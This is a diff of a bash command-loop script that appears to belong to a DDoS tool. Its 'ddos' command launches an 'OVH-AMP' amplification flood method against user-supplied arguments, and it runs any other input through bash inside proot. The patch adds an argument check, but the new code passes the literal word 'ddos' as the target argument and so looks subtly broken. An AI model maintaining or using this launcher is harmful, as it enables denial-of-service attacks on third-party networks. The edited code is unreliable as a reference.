@@ -50,14 +50,17 @@ if [[ -f "./installed" ]]; then
         if [ "$cmdtorun" == "end" ]; then
         
             echo "✓ Success."
+            
             exit
         
         fi
         
-        if [ "${cmdtorun[0]}" == "ddos" ]; then
-
-            ~/root/methods/OVH-AMP ${cmdtorun[1]} ${cmdtorun[2]}
-        
+        if [ "$cmdtorun" == "ddos" ]; then
+            if [ ${#cmdtorun[@]} -ge 2 ]; then
+                ~/root/methods/OVH-AMP "${cmdtorun[0]}" "${cmdtorun[1]}"
+            else
+                echo "Error: ddos command requires at least 2 arguments."
+            fi
         fi
         
         ./libraries/proot -S . /bin/bash -c "$cmdtorun"
